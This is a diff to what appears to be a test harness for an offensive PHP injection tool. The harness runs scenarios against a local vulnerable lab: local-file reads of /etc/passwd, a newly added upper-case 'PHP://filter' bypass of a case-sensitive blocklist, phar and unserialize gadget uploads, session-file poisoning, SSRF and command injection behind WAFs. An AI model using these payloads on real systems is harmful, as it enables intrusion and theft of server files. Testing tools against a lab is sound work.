@@ -42,7 +42,8 @@ PS_PORT = int(os.environ.get("IK_PS_PORT", "8086"))
 CMD_PORT = int(os.environ.get("IK_CMD_PORT", "8087"))
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 PY = sys.executable
-LAB = f"http://{HOST}:8080"
+LAB_PORT = int(os.environ.get("IK_PORT", "18080"))
+LAB = f"http://{HOST}:{LAB_PORT}"
 
 # The lab's own markers. A hand check that finds one of these has read something
 # the application did not put there by accident.
@@ -198,6 +199,7 @@ SCENARIOS: list[tuple[str, str, str]] = [
     # group, name, what it is for
     ("lfi", "plain-path", "the application's own include() reading a plain path"),
     ("lfi", "wrapper-base64", "php://filter source disclosure"),
+    ("lfi", "case-sensitive", "a filter that compares its blocklist without folding case"),
     ("shell", "filter-chain", "code execution through a php://filter chain"),
     ("shell", "log-poisoning", "code execution through a file the server writes"),
     ("deserialize", "phar-gadget", "a gadget deserialized from an uploaded archive"),
@@ -226,11 +228,31 @@ LAB_LOG = "/opt/injectorkit-lab/logs/apache-access.log"
 
 
 def scenario_lfi(name: str) -> Result:
-    base = f"http://{HOST}:8080/include.php"
+    base = f"http://{HOST}:{LAB_PORT}/include.php"
     if name == "plain-path":
         url = f"{base}?file=/etc/passwd"
         result = Result(name, url, ["proto", "-u", f"{base}?file=index.php", "--read", "/etc/passwd"])
         result.hand, result.hand_note = hand_lfi(base, "/etc/passwd", PASSWD)
+    elif name == "case-sensitive":
+        # Behind a filter that compares its blocklist without folding case. The
+        # lower-case spelling is refused and `PHP://` is not, because PHP looks
+        # the scheme up case-insensitively - measured, all six spellings of the
+        # wrapper read the file. The hand check arrives at that spelling itself,
+        # one request at a time, the way a person would.
+        filtered = f"http://{HOST}:8088/include.php"
+        payload = "PHP://filter/convert.base64-encode/resource=/etc/passwd"
+        url = f"{filtered}?file={urllib.parse.quote(payload, safe='')}"
+        result = Result(
+            name,
+            url,
+            ["proto", "-u", f"{filtered}?file=index.php", "--read", "/etc/passwd"],
+            # The evidence, and only it: the file has to have come back. Without
+            # this the scenario agrees when the tool fails too - and a filter
+            # started as the wrong profile (case-insensitive, so `PHP://` is
+            # refused as well) fails both sides identically and reads as a pass.
+            must=r"\[\+\] read /etc/passwd",
+        )
+        result.hand, result.hand_note = hand_wrapper(filtered, payload, PASSWD)
     else:
         payload = "php://filter/convert.base64-encode/resource=/etc/passwd"
         url = f"{base}?file={urllib.parse.quote(payload, safe='')}"
@@ -240,7 +262,7 @@ def scenario_lfi(name: str) -> Result:
 
 
 def scenario_ssrf(name: str) -> Result:
-    base = f"http://{HOST}:8080/fetch.php"
+    base = f"http://{HOST}:{LAB_PORT}/fetch.php"
     if name == "internal-service":
         target = "http://127.0.0.1:8899/"
         url = f"{base}?url={urllib.parse.quote(target, safe='')}"
@@ -267,6 +289,7 @@ WAF_PORTS = {
     "semantic-c": 8083,
     "whitelist-d": 8084,
     "first-value-e": 8085,
+    "case-sensitive": 8088,
     "donothack": 8090,
 }
 
@@ -347,7 +370,7 @@ def scenario_shell(name: str) -> Result:
         result.skipped = trouble
         return result
 
-    base = f"http://{HOST}:8080/include.php"
+    base = f"http://{HOST}:{LAB_PORT}/include.php"
     url = f"{base}?file=index.php"
 
     if name == "filter-chain":
@@ -492,7 +515,7 @@ def hand_phar(base: str) -> tuple[bool, str]:
     archive = phar.build(files=[("index.php", b"<?php echo 1;")], metadata=metadata)
 
     # 3. upload it, the way a browser posts a file
-    uploaded = upload_to_lab(f"http://{HOST}:8080/upload.php", archive, "accept.phar")
+    uploaded = upload_to_lab(f"http://{HOST}:{LAB_PORT}/upload.php", archive, "accept.phar")
     if not uploaded:
         return False, "the upload endpoint did not take the archive"
 
@@ -502,7 +525,7 @@ def hand_phar(base: str) -> tuple[bool, str]:
         return False, f"the application did not deserialise it: {body.strip()[:120]}"
 
     # 5. did the gadget leave the file where it was asked to?
-    url = f"http://{HOST}:8080/uploads/{name}"
+    url = f"http://{HOST}:{LAB_PORT}/uploads/{name}"
     status, body = fetch(url)
     if marker in body:
         return True, f"the gadget wrote {url}, which serves the marker {marker}"
@@ -558,7 +581,7 @@ def lab_webroot() -> str:
         "/etc/nginx/sites-enabled/default",
         "/etc/nginx/conf.d/default.conf",
     ):
-        _, body = fetch(f"http://{HOST}:8080/include.php?file={urllib.parse.quote(path, safe='')}")
+        _, body = fetch(f"http://{HOST}:{LAB_PORT}/include.php?file={urllib.parse.quote(path, safe='')}")
         match = re.search(r"(?:DocumentRoot|root)\s+(\S+)", body)
         if match:
             return match.group(1).rstrip(";")
@@ -586,7 +609,7 @@ def hand_unserialize() -> tuple[bool, str]:
     payload = phar.php_object("Cache", {"path": written, "key": marker}).decode("utf-8", "replace")
 
     request = urllib.request.Request(
-        f"http://{HOST}:8080/prefs.php",
+        f"http://{HOST}:{LAB_PORT}/prefs.php",
         headers={"Cookie": f"prefs={urllib.parse.quote(payload, safe='')}"},
     )
     try:
@@ -595,7 +618,7 @@ def hand_unserialize() -> tuple[bool, str]:
     except Exception as error:  # noqa: BLE001
         return False, f"the request failed: {error}"
 
-    url = f"http://{HOST}:8080/uploads/{name}"
+    url = f"http://{HOST}:{LAB_PORT}/uploads/{name}"
     status, served = fetch(url)
     if marker in served:
         return True, f"the gadget wrote {url}; the page said {body.strip()[:60]!r}"
@@ -623,7 +646,7 @@ def hand_session() -> tuple[bool, str]:
 
     ident = "ikacceptsess" + secrets.token_hex(4)
     cookie = {"Cookie": f"PHPSESSID={ident}"}
-    loader = f"http://{HOST}:8080/config.php"
+    loader = f"http://{HOST}:{LAB_PORT}/config.php"
 
     # 1. the session exists once something has started one
     fetch(f"{loader}?config=x", headers=cookie)
@@ -647,7 +670,7 @@ def hand_session() -> tuple[bool, str]:
     # 3. and a writer aimed at the session file, carrying it behind a pipe
     outer = phar.php_object("Cache", {"path": session_file, "key": "ik|" + inner})
     archive = phar.build(files=[("index.php", b"<?php echo 1;")], metadata=outer)
-    uploaded = upload_to_lab(f"http://{HOST}:8080/upload.php", archive, "sess.phar")
+    uploaded = upload_to_lab(f"http://{HOST}:{LAB_PORT}/upload.php", archive, "sess.phar")
     if not uploaded:
         return False, "the upload endpoint did not take the archive"
 
@@ -664,7 +687,7 @@ def hand_session() -> tuple[bool, str]:
     # while the tool, which never read it back, succeeded.
     fetch(f"{loader}?read={urllib.parse.quote('/etc/hostname', safe='')}", headers=cookie)
 
-    url = f"http://{HOST}:8080/uploads/{name}"
+    url = f"http://{HOST}:{LAB_PORT}/uploads/{name}"
     status, served = fetch(url)
     if marker in served:
         return True, f"the session file built the object and it wrote {url}"
@@ -674,7 +697,7 @@ def hand_session() -> tuple[bool, str]:
 def scenario_deserialize(name: str) -> Result:
     """A gadget deserialized out of an archive the run put there itself."""
     if name == "session-file":
-        url = f"http://{HOST}:8080/config.php?config=index.phar&read=index.php"
+        url = f"http://{HOST}:{LAB_PORT}/config.php?config=index.phar&read=index.php"
         result = Result(
             name,
             url,
@@ -688,7 +711,7 @@ def scenario_deserialize(name: str) -> Result:
                 "--max-requests",
                 "900",
                 "--upload-to",
-                f"http://{HOST}:8080/upload.php",
+                f"http://{HOST}:{LAB_PORT}/upload.php",
                 "--phar-class",
                 "Cache",
                 "--phar-set",
@@ -705,7 +728,7 @@ def scenario_deserialize(name: str) -> Result:
         return result
 
     if name == "unserialize-gadget":
-        url = f"http://{HOST}:8080/prefs.php"
+        url = f"http://{HOST}:{LAB_PORT}/prefs.php"
         # This endpoint has one parameter and it feeds `unserialize()`, so nothing
         # on it can read the server's configuration and the web root cannot be
         # worked out from here. The operator names it, which is what the override
@@ -736,7 +759,7 @@ def scenario_deserialize(name: str) -> Result:
         result.hand, result.hand_note = hand_unserialize()
         return result
 
-    base = f"http://{HOST}:8080/config.php"
+    base = f"http://{HOST}:{LAB_PORT}/config.php"
     url = f"{base}?config=index.phar&read=index.php"
     result = Result(
         name,
@@ -747,7 +770,7 @@ def scenario_deserialize(name: str) -> Result:
             url,
             "--exploit",
             "--upload-to",
-            f"http://{HOST}:8080/upload.php",
+            f"http://{HOST}:{LAB_PORT}/upload.php",
             "--phar-class",
             "Cache",
             "--phar-set",
@@ -865,7 +888,7 @@ def scenario_cmdi(name: str) -> Result:
         result.must = r"^\s*\[\+\] result: the parameter runs commands"
         return result
 
-    port = 8090 if name == "behind-waf" else 8080
+    port = 8090 if name == "behind-waf" else LAB_PORT
     param = {"whole-command": "cmd", "embedded-argument": "host", "escaped-control": "safe"}.get(
         name, "host"
     )
@@ -964,8 +987,8 @@ def main() -> int:
             print(f"{group:6} {name:18} {what}")
         return 0
 
-    if not reachable(f"http://{HOST}:8080/include.php?file=/etc/passwd"):
-        print(f"the lab at {HOST}:8080 is not answering; start it with lab/setup.sh")
+    if not reachable(f"http://{HOST}:{LAB_PORT}/include.php?file=/etc/passwd"):
+        print(f"the lab at {HOST}:{LAB_PORT} is not answering; start it with lab/setup.sh")
         return 1
 
     results: list[Result] = []
